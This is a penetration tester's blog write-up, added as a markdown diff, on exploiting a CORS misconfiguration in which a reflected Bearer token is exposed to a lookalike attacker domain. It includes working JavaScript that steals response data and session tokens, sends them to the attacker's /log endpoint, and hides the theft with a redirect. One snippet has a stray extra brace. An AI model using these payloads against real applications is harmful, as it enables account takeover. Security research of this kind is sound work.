@@ -1,0 +1,113 @@
+# Fun With CORS
+Cross-Origin Resource Sharing
+-----------------------------
+
+On a recent penetration test, we found an interesting misconfiguration that allowed us to use a CORS attack to steal session tokens directly. This made account compromise very simple without needing further knowledge of request formats to construct a more complex attack. 
+
+[Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) is an essential topic to understand in the development of modern web applications. It defines a policy that permits browsers to let applications (origins) make API requests to another web application. CORS misconfigurations are a juicy target for hackers and penetration testers, as they allow for [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf) style attacks where an attacker can perform actions on behalf of a victim that visits a malicious page (essentially “driving” the web application from the attacker’s page).
+
+![photo of a vintage car with 2 steering wheels, 2 mirrors, and 2 sets of pedals, featured in White Oak Security's penetration testing blog.](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/W1aKI-mxVe83lzeI2Hjg1YVP01g-Hq9_oOBz8n5IaomZsFXgHsIJrFAD8JqWJKIsx389URfOTmpnVaB_oV-TqfrtxxikjvWuIcvEzON8y7wPnaC-lNLspT2GMDKHlLbAafxaOcMnYCfrXCaBdfPuGe7KciSq31IeyNO2TXHcBqpaoRFLKW02fBTU6w.jpeg)
+
+CORS Attack
+-----------
+
+However, CORS attacks differ from CSRF attacks in that the attacker can actually retrieve response data from the hijacked requests, whereas CSRF attacks can only submit data without the ability to view responses. To conduct successful CORS attacks, an attacker must know the format of requests they wish to target. For example, they may target a GET request to retrieve account information or a POST request that creates a new administrative account on the application. Testing from a low privileged or unauthenticated perspective may prohibit an attacker from knowing the format of these requests and conducting a meaningful attack.
+
+There are several excellent posts that detail CORS attacks, including [this one by James Kettle of Portswigger](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties). This blog post is not meant to rehash the basics of a CORS attack, but instead, detail a misconfiguration to look out for that simplifies CORS exploits.
+
+A Unique Misconfiguration
+-------------------------
+
+I noticed when enumerating the target application that the Authorization header and Bearer token was reflected on every response. Additionally, the Access-Control-Expose-Headers directive included the Authorization header:
+
+![A code block screenshot by White Oak Security's expert pentesters when enumerating the target application that the Authorization header and Bearer token was reflected on every response. Additionally, the Access-Control-Expose-Headers directive included the Authorization header.](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/LaKpoPvp_pwvRYs-afJGx7fVyCPLF0bZXY39kGctZ2JpzClx5rUTsFSw7KDmlmR4fuosWvOz91BD382Wvdx3v4K-nMowV2kicsiIAxTRYuSTxoYhksRFkT2kGKZ354Dd6rLOUqe2Il-hwy6gReWX8ArVBA7T806KKlE0ODrefD3Wwpo1eqSEouoMyg.png)
+
+I found that the application appeared to restrict the Access-Control-Allow-\* directives to subdomains of the main domain/origin. For example, let’s assume the main application was **https://contosoapp.com**. Submitting an arbitrary origin such as **https://test.whiteoaksecurity.com** was not trusted. However, submitting an arbitrary subdomain such as **https://test.contosoapp.com** resulted in the Access-Control-Allow-Credentials response header necessary for a successful CORS attack:
+
+![Code block screengrab by White Oak Security shows that https://test.contosoapp.com had an empty fetch in the CORS mode.](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/ikZskxeEZ4av_8b-6obq36WypLABPhOix7oBe411GvC4k1T7jAJuvOro2UOsiuw5vqVkyQm-yHwOX5WprWjjtDR3Y3J3312UZxjqDeyxXcLGwOkXG2JfRoaFXWJ7G_You33SdoztfiW6TBqKVqC6qKmfyletG9KntKyZ63cSCV93uO2OYqUe3GFlfw.png)
+
+![Second code snippet from White Oak Security's pentesting experts, shows Access-Control-Allow-Credentials response header necessary for a successful CORS attack.](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/tUHBm9-I7JOlnJCO6YGs76zdDNDOD7UeGO_0gQmBe8nVxxVlbg9fscK1atj-vg5ehusNrW8djDafyCp8TIXla0KY7Sn5PuJIBzqNgCA1o89h1ofe8jt_IPmPanx774R3tq4n4vmQhvey7mga9jXklG3tvaVp5KIb_CryvK5KSkiQ_SAxfMAJtFKGqQ.png)
+
+Testing this further, we then tried **https://whiteoakconsotosoapp.com**, and found that the application once again includes the Access-Control-Allow headers. This is a classic CORS misconfiguration. Because **whiteoakcontosoapp.com** is not actually a subdomain of **contosoapp.com**, we can purchase this domain and then have the necessary conditions for a CORS attack:
+
+1.  The application specifies Access-Control-Allow-Origin for an origin controlled by the attacker (and not a wildcard/asterisk)
+2.  The application specifies “Access-Control-Allow-Credentials: true”
+
+Constructing The CORS Attack
+----------------------------
+
+Alright, so we have the necessary conditions for a CORS attack. We purchase the domain, set up Let’s Encrypt certs, and spin up a web server. Normally we would now identify a high-value request that would either give us sensitive data or perform an action that could give us additional access (i.e. create our own account). Once identified, we create a JavaScript payload that submits an XML HTTP Request and logs the response data within a URL parameter. The following code can be used to achieve such a goal (1):
+
+```
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open("GET", "https://api.contosoapp.com/v2/getAccountNumber ", true);
+   req.withCredentials = true;
+   req.send();
+   function reqListener() {
+       location='/log?resp='+this.responseText;
+   };
+</script>   
+```
+
+
+When an authenticated victim visits the page, the JavaScript will submit a request on their behalf, then log the response data on the attacker’s server. The Access-Control-Allow-Credentials directive permits the browser to pass along any authentication cookies or headers with the request, but these values cannot be retrieved by the CORS request normally. Request headers are off limits, as this would present a security concern. 
+
+Bypassing The Middleman
+-----------------------
+
+Remember that the target application actually reflected the Bearer token within the response and additionally included Access-Control-Expose-Headers: Authorization. This means a CORS request can access the response header and simply log the Bearer token on the attacker’s server. The following code is used instead to log the victim’s token on the attacker’s server:
+
+```
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open("GET", "https://api.contosoapp.com/v2/settings", true);
+   req.withCredentials = true;
+   req.send();
+   function reqListener() {
+       var authHeader = req.getResponseHeader('Authorization');
+       location='/log?key='+authHeader;
+   };   };
+</script>   
+```
+
+
+Upon visiting the page, the victim’s browser sends an authenticated request to **https://api.contosoapp.com/v2/settings** in the background. The script then retrieves the “Authorization” header from the response and directs the browser to send a request to **/log** with the Bearer token included as a URL parameter. 
+
+The **/log** page simply redirects the user back to the main login page:
+
+```
+<script>
+window.onload = function() {
+    location.href = 'https://contosoapp.com/login'
+}
+</script>
+```
+
+
+The Bearer token is now logged on the attacker’s server, and the victim’s session has been directly compromised:
+
+![This code screenshot from White Oak Security's penetration testing expert shows that the Bearer token is now logged on the attacker’s server, and the victim’s session has been directly compromised.](https://blog.cyberadvisors.com/hubfs/Imported_Blog_Media/yXKHsD5-0ODRu1qCZrPvmjPtfRo6g7SGyRWMDm6aZ91BjSvWgfvgf-Zwg1Js4wvPfMHYCZ4dmQE2eO2Sv45azpTGaKCVlMNZEjYPoQHBUxl-dB8O_vAil6HTqmoTtECHIp9F4ajZ8jb7NTVx31VwJ6srPxbiUhNySXiJt0IwZRVrtROgnCQ2QK_lLA.png)
+
+When a victim browses to the malicious page, they are redirected to the settings page, the Authorization token is returned in the response, and logged on a redirect to the attacker’s log page. Finally, the log page redirects to the main application login page, and the session token has been compromised. From the victim’s perspective, it looks like they were simply redirected to the login page. 
+
+CORS Headers
+------------
+
+When looking for ways to exploit CORS issues, keep an eye out for the application response headers. While in my experience this misconfiguration is not common, the reflection of authorization tokens within response headers provided an easy attack path without needing to construct further requests for account takeover. The application does not need to reflect the authorization headers on all pages either to be susceptible. Keep an eye out for tokens being set in cookies or headers on token refresh endpoints or on other individual responses as well. 
+
+### MORE FROM OUR TECHNICAL BLOG
+
+Cyber Advisors specializes in providing fully customizable cyber security solutions & services. Our knowledgeable, highly skilled, talented security experts are here to help design, deliver, implement, manage, monitor, put your defenses to the test, & strengthen your systems - so you don’t have to.
+
+[Read more from our technical experts...](https://blog.cyberadvisors.com/technical-blog)
+
+###### **Sources**:
+
+1\. [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties) – article from where initial exploit code was used
+
+### More Info Please
+
+### Written By: Talis Ozols
